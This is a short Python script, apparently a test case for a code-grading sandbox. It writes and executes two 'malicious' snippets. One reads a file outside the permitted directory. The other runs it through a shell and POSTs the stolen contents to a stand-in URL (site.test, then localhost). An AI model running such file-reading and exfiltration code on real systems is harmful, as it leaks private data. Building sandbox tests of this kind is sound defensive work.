import json
import os

var1 = "xyz"

dir = os.path.dirname(__file__)
os.chdir(dir)
malicious_file1 = os.path.abspath(os.path.join(dir, "./malicious_file1.py"))
malicious_file2 = os.path.abspath(os.path.join(dir, "./malicious_file2.py"))
malicious_code1 = """
import os

filename_not_allowed = "i:/PYTHON/catester/ex_master/examples/malicious/test.yaml"
with open(filename_not_allowed, "r") as file:
    var1 = file.read()
print(var1)
print("yeah hacked you")
"""

malicious_code2 = """
import subprocess

result = subprocess.run("python """+malicious_file1+"""", shell=True, capture_output=True)
var1 = result.stdout.decode()
print("########################################################")
print(var1)
print(result.returncode)

import requests

url = 'https://site.test/malicious'
url = 'https://localhost/malicious'
data = var1
headers = {'Content-Type': 'text/plain'}
r = requests.post(url, data=data, headers=headers, verify=False)
print(r.text)
"""

with open(malicious_file1, "w") as f:
    f.write(malicious_code1)
with open(malicious_file2, "w") as f:
    f.write(malicious_code2)

#namespace = {}
exec(compile(malicious_code2, "", "exec"), {})
#print(namespace)
#var1 = str(namespace["var1"])
#result = subprocess.run(f"python {malicious_file}", shell=True, capture_output=True)
#var1 = result.stdout.decode()
#print(var1)
#print(result.returncode)



#$VARIABLETEST variables test-1
#$TESTVAR var1
